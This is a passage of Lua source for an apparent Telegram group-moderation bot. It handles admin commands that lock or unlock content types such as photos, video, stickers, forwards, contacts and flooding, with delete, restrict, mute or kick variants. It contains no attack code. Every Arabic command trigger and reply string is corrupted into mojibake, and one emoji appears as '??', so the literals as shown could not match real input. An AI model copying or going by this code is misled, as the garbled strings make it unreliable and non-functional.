database:del(bot_id.."Tshake:Lock:hashtak"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΨͺΨ§Ω")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Cmd"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω Ψ¨Ψ§ΩΨͺΩΩΨ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Cmd"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","??οΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω Ψ¨Ψ§ΩΩΨͺΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Cmd"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Cmd"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω" and Addictive(msg) then
database:del(bot_id.."Tshake:Lock:Cmd"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω")  
return false
end 
if text == 'ΩΩΩ Ψ§ΩΩΨ΄Ψ§Ψ±' and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
database:set(bot_id..'lock:Fshar'..msg.chat_id_,true) 
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΨ΄Ψ§Ψ±")  
end
if text == 'ΩΩΩ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ' and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
database:set(bot_id..'lock:Fars'..msg.chat_id_,true) 
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ")  
end
if text == 'ΩΨͺΨ­ Ψ§ΩΩΨ΄Ψ§Ψ±' and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
database:del(bot_id..'lock:Fshar'..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏ ΨͺΩΩ ΩΩΨͺΨ­ Ψ§ΩΩΨ΄Ψ§Ψ±\n")  
end
if text == 'ΩΨͺΨ­ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ' and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
database:del(bot_id..'lock:Fars'..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏ ΨͺΩΩ ΩΩΨͺΨ­ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ\n")  
end
if text == "ΩΩΩ Ψ§ΩΨ΅ΩΨ±"and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Photo"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ΅ΩΨ±")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΅ΩΨ± Ψ¨Ψ§ΩΨͺΩΩΨ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Photo"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ΅ΩΨ±")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΅ΩΨ± Ψ¨Ψ§ΩΩΨͺΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Photo"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ΅ΩΨ±")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΅ΩΨ± Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Photo"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ΅ΩΨ±")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨ±" and Addictive(msg) then
database:del(bot_id.."Tshake:Lock:Photo"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨ±")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ―ΩΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Video"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ―ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ―ΩΩ Ψ¨Ψ§ΩΨͺΩΩΨ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Video"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ―ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ―ΩΩ Ψ¨Ψ§ΩΩΨͺΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Video"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ―ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ―ΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Video"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ―ΩΩ")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΩΩΨ―ΩΩ" and Addictive(msg) then
database:del(bot_id.."Tshake:Lock:Video"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΩΨ―ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Animation"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ Ψ¨Ψ§ΩΨͺΩΩΨ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Animation"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ Ψ¨Ψ§ΩΩΨͺΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Animation"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Animation"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ" and Addictive(msg) then
database:del(bot_id.."Tshake:Lock:Animation"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:geam"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ Ψ¨Ψ§ΩΨͺΩΩΨ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:geam"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ Ψ¨Ψ§ΩΩΨͺΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:geam"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:geam"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨" and Addictive(msg) then
database:del(bot_id.."Tshake:Lock:geam"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Audio"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ Ψ¨Ψ§ΩΨͺΩΩΨ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Audio"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ Ψ¨Ψ§ΩΩΨͺΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Audio"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Audio"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ§ΨΊΨ§ΩΩ" and Addictive(msg) then
database:del(bot_id.."Tshake:Lock:Audio"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ§ΨΊΨ§ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΅ΩΨͺ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:vico"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ΅ΩΨͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΅ΩΨͺ Ψ¨Ψ§ΩΨͺΩΩΨ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:vico"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ΅ΩΨͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΅ΩΨͺ Ψ¨Ψ§ΩΩΨͺΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:vico"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ΅ΩΨͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΅ΩΨͺ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:vico"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ΅ΩΨͺ")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨͺ" and Addictive(msg) then
database:del(bot_id.."Tshake:Lock:vico"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ¨ΩΨ±Ψ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Keyboard"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ¨ΩΨ±Ψ―")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ¨ΩΨ±Ψ― Ψ¨Ψ§ΩΨͺΩΩΨ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Keyboard"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ¨ΩΨ±Ψ―")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ¨ΩΨ±Ψ― Ψ¨Ψ§ΩΩΨͺΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Keyboard"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ¨ΩΨ±Ψ―")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ¨ΩΨ±Ψ― Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Keyboard"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ¨ΩΨ±Ψ―")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΩΩΨ¨ΩΨ±Ψ―" and Addictive(msg) then
database:del(bot_id.."Tshake:Lock:Keyboard"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΩΨ¨ΩΨ±Ψ―")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Sticker"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ Ψ¨Ψ§ΩΨͺΩΩΨ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Sticker"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ Ψ¨Ψ§ΩΩΨͺΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Sticker"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Sticker"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ" and Addictive(msg) then
database:del(bot_id.."Tshake:Lock:Sticker"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:forward"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ Ψ¨Ψ§ΩΨͺΩΩΨ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:forward"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ Ψ¨Ψ§ΩΩΨͺΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:forward"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:forward"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨͺΩΨ¬ΩΩ" and Addictive(msg) then
database:del(bot_id.."Tshake:Lock:forward"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΨͺΩΨ¬ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Document"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ Ψ¨Ψ§ΩΨͺΩΩΨ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Document"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ Ψ¨Ψ§ΩΩΨͺΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Document"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Document"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΩΨ§Ψͺ")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΩΩΩΨ§Ψͺ" and Addictive(msg) then
database:del(bot_id.."Tshake:Lock:Document"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΩΩΨ§Ψͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ³ΩΩΩΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Unsupported"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ³ΩΩΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ³ΩΩΩΩ Ψ¨Ψ§ΩΨͺΩΩΨ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Unsupported"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ³ΩΩΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ³ΩΩΩΩ Ψ¨Ψ§ΩΩΨͺΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Unsupported"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ³ΩΩΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ³ΩΩΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Unsupported"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ³ΩΩΩΩ")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ³ΩΩΩΩ" and Addictive(msg) then
database:del(bot_id.."Tshake:Lock:Unsupported"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ³ΩΩΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Markdaun"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ Ψ¨Ψ§ΩΨͺΩΩΨ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Markdaun"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ Ψ¨Ψ§ΩΩΨͺΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Markdaun"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Markdaun"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ" and Addictive(msg) then
database:del(bot_id.."Tshake:Lock:Markdaun"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΨ§Ψ±ΩΨ―Ψ§ΩΩ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Contact"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ Ψ¨Ψ§ΩΨͺΩΩΨ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Contact"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ Ψ¨Ψ§ΩΩΨͺΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Contact"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Contact"..msg.chat_id_,"kick")  
Reply_Status(msg,msg.sender_user_id_,"lockkick","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΨ¬ΩΨ§Ψͺ")  
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ¬ΩΨ§Ψͺ" and Addictive(msg) then
database:del(bot_id.."Tshake:Lock:Contact"..msg.chat_id_)  
Reply_Status(msg,msg.sender_user_id_,"unlock","ποΈβΏΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ¬ΩΨ§Ψͺ")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Spam"..msg.chat_id_,"del")  
Reply_Status(msg,msg.sender_user_id_,"lock","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄ Ψ¨Ψ§ΩΨͺΩΩΨ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Spam"..msg.chat_id_,"ked")  
Reply_Status(msg,msg.sender_user_id_,"lockkid","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄ Ψ¨Ψ§ΩΩΨͺΩ" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Spam"..msg.chat_id_,"ktm")  
Reply_Status(msg,msg.sender_user_id_,"lockktm","ποΈβΏΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄")  
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ§ΩΨ΄ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Addictive(msg) then
database:set(bot_id.."Tshake:Lock:Spam"..msg.chat_id_,"kick")  
